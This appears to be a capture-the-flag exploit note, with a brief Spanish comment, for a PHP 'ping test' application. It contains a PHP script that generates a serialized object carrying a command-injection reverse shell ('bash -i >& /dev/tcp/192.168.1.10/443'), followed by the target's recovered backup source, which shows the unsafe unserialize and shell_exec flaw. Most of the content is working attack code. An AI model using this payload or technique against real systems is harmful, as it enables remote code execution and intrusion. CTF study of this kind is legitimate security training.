<?php

class pingTest {
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.1.10/443 0>&1'";
	public $isValid = True;
	public $output = "";

}

echo urlencode(serialize(new pingTest));

?>



segun este php que obtuvimos haciendo reconocimiento de directorios y archivos. pues este es el index.php.bak


/*<?php*/
/**/
/*class pingTest {*/
/*	public $ipAddress = "127.0.0.1";*/
/*	public $isValid = False;*/
/*	public $output = "";*/
/**/
/*	function validate() {*/
/*		if (!$this->isValid) {*/
/*			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))*/
/*			{*/
/*				$this->isValid = True;*/
/*			}*/
/*		}*/
/*		$this->ping();*/
/**/
/*	}*/
/**/
/*	public function ping()*/
/*        {*/
/*		if ($this->isValid) {*/
/*			$this->output = shell_exec("ping -c 3 $this->ipAddress");	*/
/*		}*/
/*        }*/
/**/
/*}*/
/**/
/*if (isset($_POST['obj'])) {*/
/*	$pingTest = unserialize(urldecode($_POST['obj']));*/
/*} else {*/
/*	$pingTest = new pingTest;*/
/*}*/
/**/
/*$pingTest->validate();*/
/**/
/*echo "<html>*/
/*<head>*/
/*<script src=\"http://secure.cereal.ctf:44441/php.js\"></script>*/
/*<script>*/
/*function submit_form() {*/
/*		var object = serialize({ipAddress: document.forms[\"ipform\"].ip.value});*/
/*		object = object.substr(object.indexOf(\"{\"),object.length);*/
/*		object = \"O:8:\\\"pingTest\\\":1:\" + object;*/
/*		document.forms[\"ipform\"].obj.value = object;*/
/*		document.getElementById('ipform').submit();*/
/*}*/
/*</script>*/
/*<link rel='stylesheet' href='http://secure.cereal.ctf:44441/style.css' media='all' />*/
/*<title>Ping Test</title>*/
/*</head>*/
/*<body>*/
/*<div class=\"form-body\">*/
/*<div class=\"row\">*/
/*    <div class=\"form-holder\">*/
/*	<div class=\"form-content\">*/
/*	    <div class=\"form-items\">*/
/*		<h3>Ping Test</h3>*/
/**/
/*		<form method=\"POST\" action=\"/\" id=\"ipform\" onsubmit=\"submit_form();\" class=\"requires-validation\" novalidate>*/
/**/
/*		    <div class=\"col-md-12\">*/
/*			<input name=\"obj\" type=\"hidden\" value=\"\">*/
/*		       <input class=\"form-control\" type=\"text\" name=\"ip\" placeholder=\"IP Address\" required>*/
/*		    </div>*/
/*		<br />*/
/*		    <div class=\"form-button mt-3\">*/
/*			<input type=\"submit\" value=\"Ping!\">*/
/*			<br /><br /><textarea>$pingTest->output</textarea>*/
/*		    </div>*/
/*		</form>*/
/*	    </div>*/
/*	</div>*/
/*    </div>*/
/*</div>*/
/*</div>*/
/*</body>*/
/*</html>";*/
/**/
/*?> */







